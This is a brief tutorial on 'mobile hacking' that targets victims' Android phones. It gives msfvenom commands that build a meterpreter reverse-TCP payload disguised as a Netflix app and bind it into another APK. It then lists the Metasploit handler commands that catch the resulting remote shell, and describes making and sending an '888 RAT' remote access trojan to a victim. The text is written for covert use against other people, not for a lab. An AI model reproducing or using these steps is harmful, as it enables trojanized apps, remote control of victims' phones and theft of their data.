First Method :
Mobile Hacking through msfvenom :
#msfvenom -p android/meterpreter/reverse_tcp LHOST=<ip address> LPORT=1337 -o /home/kali/Desktop/netflix.apk - This command will create our apk.
#msfvenom -x flappy.apk -p android/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=1337 -o flappynew.apk - For binding our trojan with another apk.

Listen connection on metasploit :
#msfconsole
#use exploit/multi/handler
#set payload android/meterpreter/reverse_tcp
#set lhost <Ip address>
#set lport 1337
#exploit
After that install that apk in victim's mobile for the connection.
Now use command #help to show the full menu.

Secoond Method :
Mobile Hacking through 888 RAT(Remote Access Trojan) :
For this rat first you have to install java jdk and JRE in your system, then you have to copy apktool file and paste it to Win+R>%temp%>apkx and paste this in this folder.
Now make a RAT using this tool, set your ip, port and we can find this rat in %temp% file. After that send this rat to victim, when victim will install this we will get
the access.
